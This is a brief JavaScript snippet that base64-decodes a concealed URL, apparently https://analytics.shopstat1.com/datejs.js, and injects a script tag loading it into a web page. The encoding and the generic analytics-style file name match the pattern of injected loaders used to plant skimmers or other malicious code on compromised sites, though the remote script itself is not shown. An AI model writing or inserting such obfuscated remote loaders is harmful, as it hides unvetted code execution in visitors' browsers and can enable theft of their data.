var string = 'aHR0cHM6Ly9hbmFseXRpY3Muc2hvcHN0YXQxLmNvbS9kYXRlanMuanM=';
var decodedString = atob(string);




var js = document.createElement('script');
js.src = ''+ decodedString +'';
var first = document.getElementsByTagName('script')[0];
first.parentNode.insertBefore(js, first);
